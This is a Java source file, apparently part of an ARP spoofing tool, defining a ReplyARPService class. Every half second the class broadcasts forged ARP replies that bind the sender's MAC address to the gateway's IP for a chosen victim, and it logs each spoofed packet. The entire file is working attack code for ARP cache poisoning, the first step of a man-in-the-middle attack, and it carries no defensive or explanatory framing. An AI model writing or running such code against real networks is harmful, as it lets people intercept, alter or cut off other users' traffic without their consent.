package org.bitducks.spoofing.services;

import java.io.IOException;
import java.net.InetAddress;

import jpcap.packet.ARPPacket;

import org.apache.log4j.Logger;
import org.bitducks.spoofing.core.InterfaceInfo;
import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.packet.PacketFactory;
import org.bitducks.spoofing.util.Constants;
import org.bitducks.spoofing.util.gateway.GatewayFinder;


public class ReplyARPService extends Service {
	private InterfaceInfo infoInterface;
	private InetAddress victim;
	private InetAddress gateway;
	
	public ReplyARPService(InetAddress victim) {
		super();
		this.victim = victim;
		infoInterface = Server.getInstance().getInfo();
		try {
			gateway = GatewayFinder.find(infoInterface.getDevice());
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void run() {
		while(! this.isCloseRequested()){
			replySpoof();
			
			//Waiting 500ms to be sure we don't use all the CPU
			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
	
	public void replySpoof() {
		ARPPacket spoofedPacket = PacketFactory.arpReply(infoInterface.getMacAddress(), gateway, victim, Constants.BROADCAST);
		logger.info("Sending a spoofed ARP reply to " + victim);
		Server.getInstance().sendPacket(spoofedPacket);
	}

}
